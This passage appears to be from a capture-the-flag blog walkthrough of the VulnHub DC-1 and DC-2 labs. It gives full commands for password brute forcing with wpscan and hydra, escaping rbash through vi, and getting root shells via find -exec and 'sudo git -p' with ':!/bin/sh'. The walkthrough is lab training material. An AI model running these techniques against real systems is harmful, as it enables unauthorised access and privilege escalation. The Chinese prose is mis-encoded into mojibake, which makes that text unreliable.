alt="image-20220830162407934"></p><p>äºæ˜¯å¯ä»¥åˆ©ç”¨<code>find</code>è·å–<code>root</code>æƒé™<code>shell</code></p><p>ä¸»è¦æ˜¯è¦è®©<code>find</code>å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œæ‰¾ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶å³å¯</p><blockquote><p>ä»¥åœ¨æ ¹ç›®å½•ä¸ºä¾‹<br>è¾“å…¥<code>find / -name initrd.img -exec &quot;/bin/sh&quot; \;</code></p></blockquote><p>ææƒæˆåŠŸ</p><p><img src="/2022/08/29/vulnhub/image-20220830164525214.png" alt="image-20220830164525214"></p><p>æˆ‘ä»¬åœ¨<code>flag4</code>é‡ŒçŸ¥é“ï¼Œæœ€åçš„æ——å­åœ¨<code>root</code>ç›®å½•é‡Œ</p><blockquote><p>è¾“å…¥<code>cd /root;ls -a</code></p></blockquote><p>å‘ç°<code>thefinalflag.txt</code></p><p><img src="/2022/08/29/vulnhub/image-20220830164848589.png" alt="image-20220830164848589"></p><blockquote><p><code>Well done!!!!</code></p><p><code>Hopefully you&#39;ve enjoyed this and learned some new skills.</code></p><p><code>You can let me know what you thought of this little journey</code><br><code>by contacting me via Twitter - @DCAU7</code><br>æ„æ€æ˜¯ï¼š<br>åšå¾—å¥½ï¼ï¼ï¼ï¼</p><p>å¸Œæœ›ä½ å–œæ¬¢è¿™ä¸€ç‚¹ï¼Œå¹¶å­¦ä¹ äº†ä¸€äº›æ–°æŠ€èƒ½ã€‚</p><p>ä½ å¯ä»¥å‘Šè¯‰æˆ‘ä½ å¯¹è¿™æ¬¡å°æ—…è¡Œçš„çœ‹æ³•<br>é€šè¿‡Twitterè”ç³»æˆ‘-@DCAU7 </p></blockquote><p><strong>5ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p><hr><h1 id="äºŒã€DC-2-åˆçº§"><a href="#äºŒã€DC-2-åˆçº§" class="headerlink" title="äºŒã€DC-2[åˆçº§]"></a>äºŒã€DC-2[åˆçº§]</h1><p><strong>five flags</strong></p><h2 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p> å…ˆç”¨<code>nmap</code>æ‰«æä¸€äº›</p><blockquote><p>è¾“å…¥<code>nmap -p- 192.168.133.138</code></p></blockquote><p>å‘ç°å†…å®¹å¤ªå°‘äº†</p><p><img src="/2022/08/29/vulnhub/image-20220831205238565.png" alt="image-20220831205238565"></p><blockquote><p>è¾“å…¥<code>nmap -p- 192.168.133.138 -A</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p><p>å‘ç°<code>7744</code>ç«¯å£è¿è¡Œçš„<code>ssh</code>ï¼Œ<code>22</code>ç«¯å£è¢«æ¢äº†</p><blockquote><p>Sshæ˜¯ä¸€ä¸ªå®‰å…¨çš„è¿œç¨‹ç™»å½•åè®®,å®ƒçš„ç«¯å£å·é»˜è®¤æ˜¯22ç«¯å£</p></blockquote><blockquote><p>SSH ä¸º Secure Shell çš„ç¼©å†™ï¼Œç”± IETF çš„ç½‘ç»œå°ç»„ï¼ˆNetwork Working Groupï¼‰æ‰€åˆ¶å®šï¼›SSH ä¸ºå»ºç«‹åœ¨åº”ç”¨å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ã€‚SSH æ˜¯è¾ƒå¯é ï¼Œä¸“ä¸ºè¿œç¨‹ç™»å½•ä¼šè¯å’Œå…¶ä»–ç½‘ç»œæœåŠ¡æä¾›å®‰å…¨æ€§çš„åè®®ã€‚åˆ©ç”¨ SSH åè®®å¯ä»¥æœ‰æ•ˆé˜²æ­¢è¿œç¨‹ç®¡ç†è¿‡ç¨‹ä¸­çš„ä¿¡æ¯æ³„éœ²é—®é¢˜ã€‚SSHæœ€åˆæ˜¯UNIXç³»ç»Ÿä¸Šçš„ä¸€ä¸ªç¨‹åºï¼Œåæ¥åˆè¿…é€Ÿæ‰©å±•åˆ°å…¶ä»–æ“ä½œå¹³å°ã€‚SSHåœ¨æ­£ç¡®ä½¿ç”¨æ—¶å¯å¼¥è¡¥ç½‘ç»œä¸­çš„æ¼æ´ã€‚SSHå®¢æˆ·ç«¯é€‚ç”¨äºå¤šç§å¹³å°ã€‚å‡ ä¹æ‰€æœ‰UNIXå¹³å°â€”åŒ…æ‹¬HP-UXã€Linuxã€AIXã€Solarisã€Digital UNIXã€Irixï¼Œä»¥åŠå…¶ä»–å¹³å°ï¼Œéƒ½å¯è¿è¡ŒSSHã€‚</p></blockquote><p>æˆ‘ä»¬è¯•è¯•è®¿é—®æˆ‘ä»¬çš„é¶æœº<code>ip</code>ï¼š<code>192.168.133.138</code></p><hr><p>ä½†æ˜¯è®¿é—®å¤±è´¥ã€å¦‚æœæ²¡æœ‰é—®é¢˜ï¼Œå¯ä»¥å¿½ç•¥ã€‘</p><p><img src="/2022/08/29/vulnhub/image-20220831210742250.png" alt="image-20220831210742250"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè®¿é—®<code>IP</code>çš„æ—¶å€™è¿›è¡Œäº†ä¸€ä¸ªè·³è½¬ï¼Œè·³è½¬åˆ°äº†<code>http://dc-2</code>ï¼Œä¸”æ— æ³•è®¿é—®</p><p>æˆ‘çŒœæµ‹æ˜¯<code>hosts</code>æ–‡ä»¶æ²¡æœ‰ä¿®æ”¹ï¼Œæ‰€ä»¥åŸŸåæ— æ³•ç™»å½•</p><p>éœ€è¦åœ¨<code>hosts</code>å…¶ä¸­æ·»åŠ åŸŸåï¼š<code>http://dc-2</code>å’Œå…¶ipï¼š<code>192.168.133.138</code>ï¼Œ<code>dns</code>æ‰èƒ½æ­£å¸¸è½¬æ¢</p><blockquote><p>è¾“å…¥<code>vi /etc/hosts</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831211542540.png" alt="image-20220831211542540"></p><p>å‘å…¶ä¸­æ·»åŠ </p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.138</span> dc-<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220831212553718.png" alt="image-20220831212553718"></p><p>åˆ·æ–°æµè§ˆå™¨ï¼Œå†æ¬¡è®¿é—®<code>192.168.133.138</code>æˆ–<code>http://dc-2</code></p><p><img src="/2022/08/29/vulnhub/image-20220831212746196.png" alt="image-20220831212746196"></p><p>æˆåŠŸè¿æ¥</p><hr><h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>è¿›å…¥ç½‘é¡µå°±çœ‹åˆ°<code>flag</code>äº†</p><p><img src="/2022/08/29/vulnhub/image-20220831212936534.png" alt="image-20220831212936534"></p><p>ç‚¹å‡»æ‰“å¼€æŸ¥çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20220831213114724.png" alt="image-20220831213114724"></p><blockquote><p><code>Flag 1:</code></p><p><code>Your usual wordlists probably wonâ€™t work, so instead, maybe you just need to be cewl.</code></p><p><code>More passwords is always better, but sometimes you just canâ€™t win them all.</code></p><p><code>Log in as one to see the next flag.</code></p><p><code>If you canâ€™t find it, log in as another.</code></p><p>æ„æ€æ˜¯ï¼š<br>ä½ é€šå¸¸çš„å¯†ç è¡¨å¯èƒ½ä¸èµ·ä½œç”¨ï¼Œå› æ­¤ï¼Œä¹Ÿè®¸ä½ åªéœ€è¦æˆä¸ºcewlã€‚</p><p>å¯†ç è¶Šå¤šè¶Šå¥½ï¼Œä½†æœ‰æ—¶ä½ æ— æ³•èµ¢å¾—æ‰€æœ‰å¯†ç ã€‚</p><p>ä½œä¸ºä¸€ä¸ªç™»å½•ä»¥æŸ¥çœ‹ä¸‹ä¸€ä¸ªæ ‡å¿—ã€‚</p><p>å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¯·ä½œä¸ºå¦ä¸€ä¸ªç™»å½•</p><p>Â·Cewlæ˜¯ä¸€ä¸ªé€šè¿‡æŒ‡å®šurlåŠæ·±åº¦,ä½¿ç”¨çˆ¬è™«æŠ€æœ¯,ç”Ÿæˆå­—å…¸çš„ä¸€ä¸ªå·¥å…·ã€‚</p><p>é‚£æˆ‘ä»¬å°±ç”¨cewlå·¥å…·è¯•ä¸€ä¸‹<br>*ä¸ä¼šå·¥å…·ä¸€èˆ¬ç”¨-hå°±å¯ä»¥çŸ¥é“ä½¿ç”¨è¯´æ˜</p></blockquote><hr><h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>æ ¹æ®<code>flag1</code>ï¼Œæˆ‘ä»¬ç”¨<code>cewl</code>è¯•è¯•ç”Ÿæˆå­—å…¸</p><h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><blockquote><p>è¾“å…¥<code>cewl http://dc-2/ &gt;pass.txt</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831221031390.png" alt="image-20220831221031390"></p><p>ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆ<code>pass.txt</code></p><blockquote><p>è¾“å…¥<code>cat pass.txt</code>ï¼ŒæŸ¥çœ‹å†…å®¹</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831221151099.png" alt="image-20220831221151099"></p><p>å‘ç°æ˜¯ç”Ÿæˆå¯¹åº”ç½‘ç«™çš„å¯†ç å­—å…¸</p><p><code>flag1</code>æ•´ç†ä¿¡æ¯å¥½åƒå·®ä¸å¤šäº†ï¼Œä¸‹é¢æˆ‘ä»¬åˆ©ç”¨<code>dc1</code>æåˆ°çš„<code>wappalyzer</code>ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç½‘é¡µçš„æ¡†æ¶ç»“æ„æœ‰æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢</p><p><img src="/2022/08/29/vulnhub/image-20220831221945690.png" alt="image-20220831221945690"></p><p>å‘ç°ç½‘ç«™çš„<code>CMS</code>æ˜¯<code>WordPress</code>ï¼Œè¿˜å¯ä»¥çœ‹åˆ°å®ƒçš„ä¸»é¢˜æ˜¯<code>Twenty Seventeen</code></p><p>é‚£<code>wordpress</code>ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´å¯ä»¥ä¾›æˆ‘ä»¬åˆ©ç”¨å‘¢ï¼Œä¸‹é¢å°±æåŠå¦ä¸€ä¸ªå·¥å…·</p><h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><blockquote><p><code>WPScanæ˜¯Kali Linuxé»˜è®¤è‡ªå¸¦çš„ä¸€æ¬¾æ¼æ´æ‰«æå·¥å…·,å®ƒé‡‡ç”¨Rubyç¼–å†™ èƒ½å¤Ÿæ‰«æWordPressç½‘ç«™ä¸­çš„å¤šç§å®‰å…¨æ¼æ´,å…¶ä¸­åŒ…æ‹¬ä¸»é¢˜æ¼æ´ã€æ’ä»¶æ¼æ´å’ŒWordPressæœ¬èº«çš„æ¼æ´</code></p></blockquote><p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é’ˆå¯¹æ€§å¯¹wordpressè¿›è¡Œæ¸—é€çœ‹çœ‹ï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨ä¸€ä¸‹</p><blockquote><p>è¾“å…¥<code>wpscan --url http://dc-2 -e u</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831223359965.png" alt="image-20220831223359965"></p><p>ç„¶åå¾€ä¸‹çœ‹ç”¨æˆ·å</p><p><img src="/2022/08/29/vulnhub/image-20220831223432802.png" alt="image-20220831223432802"></p><p>å‘ç°æœ‰ä¸‰ä¸ªï¼Œç„¶åå¯ä»¥å¤åˆ¶ä¸‹æ¥ï¼Œå¼„ä¸€ä¸ªç”¨æˆ·åçš„æ–‡æœ¬ï¼Œå’Œä¹‹å‰çš„<code>pass.txt</code>è¿™ä¸ªå¯†ç æœ¬ä¸€æ ·</p><blockquote><p>è¾“å…¥<code>vi un.txt</code></p><p>æŠŠ<code>admin</code> <code>jerry</code> <code>tom</code>å¤åˆ¶è¿›å»</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831223714569.png" alt="image-20220831223714569"></p><p>ç„¶åå°±å¯ä»¥ç»“åˆæˆ‘ä»¬çš„å¯†ç æ–‡æœ¬å’Œç”¨æˆ·åæ–‡æœ¬ï¼Œåˆ©ç”¨<code>wpscan</code>è¿™ä¸ªå·¥å…·ï¼Œè¿›è¡Œçˆ†ç ´æ“ä½œäº†</p><blockquote><p>è¾“å…¥<code>wpscan --url http://dc-2 -P pass.txt -U un.txt</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></p><p>ç¨å¾®ç­‰ä¸€ä¼š</p><p><img src="/2022/08/29/vulnhub/image-20220831224205560.png" alt="image-20220831224205560"></p><p><code>admin</code>ç”¨æˆ·å¯†ç æ²¡æœ‰æ‰¾åˆ°ï¼Œåº”è¯¥æ˜¯æœ€é«˜æƒé™çš„è´¦å·</p><p>ä½†æ˜¯<code>jerry</code>å’Œ<code>tom</code>ç”¨æˆ·çš„å¯†ç å·²ç»çŸ¥é“äº†</p><p>ä¸‹é¢ï¼Œæˆ‘ä»¬å°±è¦å¼€å§‹æ‰¾ç™»å½•çš„é¡µé¢äº†ï¼Œä¸€èˆ¬æ˜¯åå°ç½‘ç«™</p><p>æˆ‘ä»¬å¯ä»¥ç”¨<code>dirsearch</code>å·¥å…·è¿›è¡Œæ‰«æçœ‹çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20220831224818079.png" alt="image-20220831224818079"></p><p>å‘ç°ç½‘ç«™</p><p><img src="/2022/08/29/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></p><p>ç”¨æˆ‘ä»¬ä¹‹å‰è·å¾—çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•è¯•è¯•</p><p>ä»¥<code>jerry</code>ä¸ºä¾‹ï¼Œå¥½åƒç”¨<code>tom</code>ä¼šæ˜¾ç¤ºå¯†ç é”™è¯¯</p><p>åœ¨<code>page</code>çª—å£å‘ç°<code>flag2</code></p><p><img src="/2022/08/29/vulnhub/image-20220831225233262.png" alt="image-20220831225233262"></p><p>ç‚¹å¼€æŸ¥çœ‹ï¼Œå¾—åˆ°flag2</p><p><img src="/2022/08/29/vulnhub/image-20220831225256842.png" alt="image-20220831225256842"></p><blockquote><p><code>Flag 2:</code></p><p><code>If you can&#39;t exploit WordPress and take a shortcut, there is another way.</code></p><p><code>Hope you found another entry point.</code><br>æ„æ€æ˜¯ï¼š<br>å¦‚æœä½ ä¸èƒ½åˆ©ç”¨WordPresså¹¶èµ°æ·å¾„ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ã€‚</p><p>å¸Œæœ›ä½ èƒ½æ‰¾åˆ°å¦ä¸€ä¸ªåˆ‡å…¥ç‚¹ã€‚ </p></blockquote><hr><h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>æ ¹æ®<code>flag2</code>çš„æç¤ºï¼Œå®é™…ä¸Šå°±æ˜¯è¯´ä»<code>wordpress</code>è¿™æ¡è·¯æ˜¯è¡Œä¸é€šçš„ï¼Œè¦ä»å¦å¤–çš„æ–¹å‘</p><p>ä½†æ˜¯å¦‚æœ<code>wordpress</code>è¡Œä¸é€šï¼Œè€Œè¿™ä¸ªç½‘ç«™å°±æ˜¯<code>wordpress</code>æ­å»ºèµ·æ¥çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªç½‘ç«™çš„å°±ä¸èƒ½ä¸‹æ‰‹</p><p>è™½ç„¶ç½‘ç«™çš„<code>80</code>ç«¯å£çš„<code>http</code>è¡Œä¸é€š</p><p>ä½†æ˜¯æˆ‘ä»¬ä¹‹å‰ç”¨<code>nmap</code>æ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°ç«¯å£<code>7744</code>è¿è¡Œç€<code>ssh</code>ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½åˆ©ç”¨<code>ssh</code>ç™»å½•æˆåŠŸå‘¢</p><p><img src="/2022/08/29/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></p><p>æˆ‘ä»¬å…ˆç”¨ä¹‹å‰ç”¨è¿‡çš„å·¥å…·<code>hydra</code>è¿›è¡Œçˆ†ç ´ä¸€ä¸‹ï¼Œçœ‹çœ‹è¿™ä¸ª<code>ssh</code>çš„ç”¨æˆ·æ˜¯è°</p><blockquote><p>è¾“å…¥<code>hydra -l un.txt -P pass.txt 192.168.133.138 ssh -s 7744</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831230552544.png" alt="image-20220831230552544"></p><p>å‘ç°<code>tom</code>è´¦å·æ˜¯åœ¨è¿™é‡Œç™»å½•</p><p><img src="/2022/08/29/vulnhub/image-20220831231405322.png" alt="image-20220831231405322"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ssh <span class="symbol">tom@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.138</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20220831231449571.png" alt="image-20220831231449571"></p><p>ç™»å½•æˆåŠŸåï¼Œ<code>ls</code>å‘ç°<code>flag3.txt</code></p><blockquote><p>è¾“å…¥<code>cat flag3.txt</code>ï¼ŒæŸ¥çœ‹å†…å®¹</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831231634426.png" alt="image-20220831231634426"></p><p>å‘ç°æ²¡æœ‰è¯¥å‘½ä»¤ï¼Œé‚£å°±å¯èƒ½æ˜¯æ²¡æœ‰æƒé™æ‰§è¡Œè¿™ä¸ªå‘½ä»¤äº†</p><h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>çœ‹åˆ°<code>rbash</code>ï¼Œä¸è®¤è¯†ï¼ŒæŸ¥ä¸€ä¸‹</p><blockquote><p><code>rbash</code><br>å®ƒä¸ä¸€èˆ¬shellçš„åŒºåˆ«åœ¨äºä¼šé™åˆ¶ä¸€äº›è¡Œä¸ºï¼Œè®©ä¸€äº›å‘½ä»¤æ— æ³•æ‰§è¡Œ</p></blockquote><p>çœ‹æ¥æ˜¯é™åˆ¶äº†æˆ‘ä»¬çš„å‘½ä»¤ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¾—çŸ¥é“æˆ‘ä»¬ç›®å‰è¿˜èƒ½ç”¨é‚£äº›å‘½ä»¤ï¼Œä¹‹å‰ä½¿ç”¨è¿‡<code>ls</code>ï¼Œæ‰€ä»¥<code>ls</code>å¯ä»¥ä½¿ç”¨</p><blockquote><p>è¾“å…¥<code>ls /home/tom/usr/bin</code>   </p><p>&#x2F;&#x2F;æŸ¥çœ‹rbashè®¾ç½®çš„å¯æ‰§è¡Œçš„å‘½ä»¤</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831232504736.png" alt="image-20220831232504736"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less <span class="keyword">ls</span> scp <span class="keyword">vi</span></span><br></pre></td></tr></table></figure><p>å…³é”®æ˜¯<code>vi</code>çš„å‘½ä»¤</p><h3 id="viç»•è¿‡-gt-rbashé€ƒé€¸"><a href="#viç»•è¿‡-gt-rbashé€ƒé€¸" class="headerlink" title="*viç»•è¿‡-&gt;rbashé€ƒé€¸"></a>*viç»•è¿‡-&gt;rbashé€ƒé€¸</h3><p>å¯ä»¥è¿›å…¥<code>vi</code>ä¸­ï¼Œæ‰§è¡Œ<code>set</code>å‘½ä»¤ï¼ŒæŠŠ<code>shell</code>æ”¹ä¸º<code>/bin/sh</code></p><blockquote><p> å…ˆè¾“å…¥<code>vi</code>ï¼Œè¿›å…¥<code>vi</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831233127692.png" alt="image-20220831233127692"></p><p>ç„¶å</p><blockquote><p>ç›´æ¥è¾“å…¥ï¼Œ<strong>ä¸ç”¨æŒ‰i</strong><br><code>:set shell=/bin/sh</code>    &#x2F;&#x2F;ç»™shellèµ‹å€¼<br>å›è½¦<br><code>:shell</code>                &#x2F;&#x2F;æ‰§è¡Œshell<br>å›è½¦ï¼Œå°±é€€å›ä¸»ç•Œé¢æ¥äº†</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831233626801.png" alt="image-20220831233626801"></p><p>è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†é€ƒé€¸</p><p>ä¹‹å‰å› ä¸ºæˆ‘ä»¬å—é™äº<code>rbash</code>ï¼Œä¸èƒ½æ‰§è¡Œ<code>cd</code>ç­‰å‘½ä»¤</p><p><img src="/2022/08/29/vulnhub/image-20220831233814113.png" alt="image-20220831233814113"></p><p>ç°åœ¨æ‰§è¡Œè¯•è¯•</p><p><img src="/2022/08/29/vulnhub/image-20220831234028674.png" alt="image-20220831234028674"></p><p>å°±æ²¡æœ‰é˜»æ­¢äº†</p><p>æˆ‘ä»¬å†è¯•è¯•<code>cat</code></p><p><img src="/2022/08/29/vulnhub/image-20220831234235801.png" alt="image-20220831234235801"></p><p>å‘ç°<code>cat</code>å‘½ä»¤æ‰¾ä¸åˆ°ï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»ç»•è¿‡äº†<code>rbash</code>ï¼Œæ‰€ä»¥åªèƒ½æ˜¯å…¶ä»–åŸå› ï¼Œæœ€æœ‰å¯èƒ½å°±æ˜¯<code>cat</code>çš„ç¯å¢ƒæ²¡æœ‰è®¾ç½®åˆ°å½“å‰ä½ç½®</p><blockquote><p>è¾“å…¥<code>echo $PATH</code><br>è¿™æ˜¯æ˜¾ç¤ºå½“å‰ç¯å¢ƒå˜é‡ï¼Œå¯èƒ½catå¹¶æ²¡æœ‰è¢«è®¾ç½®åˆ°å½“å‰çš„ç¯å¢ƒå˜é‡æ‰€ä»¥æ— æ³•æ‰§è¡Œ</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831234423827.png" alt="image-20220831234423827"></p><h3 id="è®¾ç½®å…¨å±€å˜é‡"><a href="#è®¾ç½®å…¨å±€å˜é‡" class="headerlink" title="*è®¾ç½®å…¨å±€å˜é‡"></a>*è®¾ç½®å…¨å±€å˜é‡</h3><blockquote><p>äºæ˜¯æˆ‘ä»¬æ¥è®¾ç½®å…¨å±€å˜é‡,ç»ˆç«¯è¾“å…¥<br><code>export PATH=PATH:/usr/local/sbin:/usr/local/bin:usr/sbin:/usr/bin:/bin:sbin</code></p></blockquote><p>è¿™æ ·æˆ‘ä»¬æ‰§è¡Œ<code>cat</code>å°±ä¸ä¼šåªåœ¨<code>/home/tom/usr/bin</code>é‡Œé¢å¯»æ‰¾äº†ï¼Œä¼šåœ¨å¾ˆå¤šç›®å½•é‡Œå¯»æ‰¾</p><blockquote><p>è¾“å…¥</p><p><code>cd tom</code><br><code>ls</code><br><code>cat flag3.txt</code><br>å¾—åˆ°flag3</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220831235038373.png" alt="image-20220831235038373"></p><blockquote><p><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</code><br>æ„æ€æ˜¯ï¼š</p><p>å¯æ€œçš„è€æ±¤å§†æ€»æ˜¯åœ¨è¿½æ°ç‘ã€‚ä¹Ÿè®¸ä»–åº”è¯¥ä¸ºä»–é€ æˆçš„æ‰€æœ‰å‹åŠ›è´Ÿè´£ã€‚</p><p>ä½†æ˜¯çœ‹åˆ°äº†suï¼Œä¹Ÿå°±æ˜¯éœ€è¦åˆ‡æ¢ç”¨æˆ·</p></blockquote><hr><h2 id="Flag4-1"><a href="#Flag4-1" class="headerlink" title="Flag4"></a>Flag4</h2><p>æ ¹æ®<code>flag3</code>ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“éœ€è¦ç”¨<code>su</code>å‘½ä»¤åˆ‡æ¢ç”¨æˆ·åˆ°<code>jerry</code></p><blockquote><p>è¾“å…¥<code>su jerry</code>å’Œå…¶å¯†ç <code>adipiscing</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220901094337288.png" alt="image-20220901094337288"></p><p>ç„¶ååˆ‡æ¢åˆ°<code>jerry</code>ç›®å½•ï¼Œå‘ç°<code>flag4.txt</code></p><p><img src="/2022/08/29/vulnhub/image-20220901094512382.png" alt="image-20220901094512382"></p><blockquote><p><code>Good to see that you&#39;ve made it this far - but you&#39;re not home yet.</code> </p><p><code>You still need to get the final flag (the only flag that really counts!!!).</code>  </p><p><code>No hints here - you&#39;re on your own now.  :-)</code></p><p><code>Go on - git outta here!!!!</code><br>æ„æ€æ˜¯ï¼š<br>å¾ˆé«˜å…´çœ‹åˆ°ä½ èµ°äº†è¿™ä¹ˆè¿œï¼Œä½†ä½ è¿˜æ²¡å›å®¶ã€‚<br>ä½ ä»ç„¶éœ€è¦å¾—åˆ°æœ€åçš„æ ‡å¿—ï¼ˆå”¯ä¸€çœŸæ­£é‡è¦çš„æ ‡å¿—ï¼ï¼ï¼ï¼‰ã€‚<br>è¿™é‡Œæ²¡æœ‰æç¤º-ä½ ç°åœ¨åªèƒ½é è‡ªå·±äº†ã€‚ï¼š-ï¼‰</p><p>å»å§-æ»šå‡ºå»ï¼ï¼ï¼ï¼</p><p>çœ‹åˆ°gitï¼Œå°±æ˜¯æç¤ºæˆ‘ä»¬ç”¨gitå‘½ä»¤</p></blockquote><hr><h2 id="Flag5-1"><a href="#Flag5-1" class="headerlink" title="Flag5"></a>Flag5</h2><h3 id="gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´"><a href="#gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´" class="headerlink" title="*gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´"></a>*gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´</h3><blockquote><p>è¾“å…¥<code>sudo -l</code><br>&#x2F;&#x2F;åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220901112624228.png" alt="image-20220901112624228"></p><p><u>å°±å¯ä»¥å‘ç°rootä»¥<code>nopasswd</code>ã€ä¸éœ€è¦å¯†ç ã€‘è¿è¡Œ<code>git</code>å‘½ä»¤</u></p><p>åŸç†æ˜¯<code>git</code>å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼Œ</p><p>åœ¨ä½¿ç”¨</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure><p>ä¸éœ€è¦è¾“å…¥<code>root</code>å¯†ç ï¼Œå³å¯ä»¥<code>root</code>èº«ä»½æ‰§è¡Œè¿™æ¡å‘½ä»¤</p><p>æ“ä½œå¦‚ä¸‹</p><blockquote><p><code>sudo git -p</code>    </p><p>&#x2F;&#x2F;-pæ˜¯åˆ†é¡µæŸ¥çœ‹ï¼Œè¿™ä¸ªåŸç†å°±æ˜¯ç»ˆç«¯çš„çª—å£å¤§å°ä¸å¤Ÿæ˜¾ç¤ºï¼Œæ‰€ä»¥ä¸‹æ–¹ä¼šå‡ºç°å†’å·ï¼Œç­‰å¾…è¾“å…¥å‘½ä»¤</p></blockquote><p>ä¸‹é¢å¯ä»¥çœ‹çœ‹åŒºåˆ«</p><h4 id="æ³¨æ„çª—å£å¤§å°"><a href="#æ³¨æ„çª—å£å¤§å°" class="headerlink" title="*æ³¨æ„çª—å£å¤§å°"></a>*æ³¨æ„çª—å£å¤§å°</h4><h5 id="1-çª—å£è¶³å¤Ÿå¤§"><a href="#1-çª—å£è¶³å¤Ÿå¤§" class="headerlink" title="1.çª—å£è¶³å¤Ÿå¤§"></a>1.çª—å£è¶³å¤Ÿå¤§</h5><p><img src="/2022/08/29/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></p><p>å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºå®Œäº†ï¼Œå°±åˆå›åˆ°åŸå¤„äº†ã€ä¸è¡Œã€‘</p><h5 id="2-çª—å£å°ä¸€äº›"><a href="#2-çª—å£å°ä¸€äº›" class="headerlink" title="2.çª—å£å°ä¸€äº›"></a>2.çª—å£å°ä¸€äº›</h5><p><img src="/2022/08/29/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></p><p>ä¸‹æ–¹å°±æ˜¾ç¤ºå‡º:ï¼Œç­‰å¾…è¾“å…¥</p><blockquote><p>å†’å·<code>:</code>æ˜¯è‡ªå¸¦æœ‰çš„ï¼Œä¸æ˜¯è¾“å…¥çš„<br><code>:!/bin/sh</code></p><p>&#x2F;&#x2F;æ„Ÿå¹å·!æ˜¯shellè½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥è¦é¿å…sudoæˆæƒç”¨æˆ·ä½¿ç”¨<code>viï¼Œvimï¼Œftpï¼Œleeï¼Œmoreï¼Œgit</code><br><code>è¿›å…¥root</code></p><p><code>cd /root</code></p><p>å½“ç„¶ä¹Ÿå¯ä»¥æ‰§è¡Œ<code>:!passwd root</code><br>ä¿®æ”¹å…¶å¯†ç <br>ç„¶å<code>su root</code>ç™»å½•ä¹Ÿå¯</p></blockquote><h3 